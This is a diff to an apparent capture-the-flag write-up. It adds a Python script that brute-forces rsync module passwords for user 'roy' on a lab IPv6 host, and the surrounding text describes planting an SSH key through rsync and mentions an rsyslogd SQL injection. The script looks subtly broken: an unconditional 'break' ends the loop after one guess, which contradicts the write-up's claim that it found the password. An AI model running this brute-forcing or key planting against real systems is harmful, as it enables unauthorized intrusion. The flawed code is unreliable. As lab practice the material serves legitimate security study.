@@ -116,6 +116,34 @@ Trying to list modules I found out we can list contents of `etc` module. Grabbin
 I found another module named `home_roy` and user `roy`
 
 Bruteforcing `rsync` credentials for user `roy` using python script we found the password "computer"
+```python
+#!/usr/bin/env python3
+import sys
+import subprocess
+from subprocess import PIPE
+wordlist = sys.argv[1]
+target_username = 'roy'
+target_address = 'dead:beef::250:56ff:feb9:a877'
+target_port = 8730
+target_module = 'home_roy'
+target_command = "rsync://{}@[{}]:{}/{}".format(target_username, target_address, target_port,
+target_module)
+f = open(wordlist, 'r', errors='ignore')
+words = f.readlines()
+for password in words:
+  password = password.rstrip()
+  pass_file = open("pass", "w+")
+  pass_file.write(password)
+  pass_file.close()
+  p = subprocess.run(['rsync', '-av', '--password-file=pass', '--list-only', target_command],stdout=PIPE, stderr=PIPE)
+  rsync_error = p.stderr.decode('utf-8')
+  rsync_output = p.stdout.decode('utf-8')
+  if rsync_error.find("auth failed") > 0:
+    print("Password: {} failed".format(password))
+  else:
+    print("Check password: {}".format(password))
+  break
+```
 
 Now that I have write access to `roy's` home directory I transfered my public key to user's home directory
 
@@ -124,6 +152,7 @@ rsync authorized_keys  "roy@[dead:beef::250:56ff:feb9:8254]::home_roy/.ssh/" -6 
 ```
 
 Logging in as user roy using my private key
+
 ![](images/roy_ssh.png)
 
 Enumerating file system and services I found that `rsyslog` service is running with `postgresql`. SQL Injection Vulnerability present in rsyslogd.
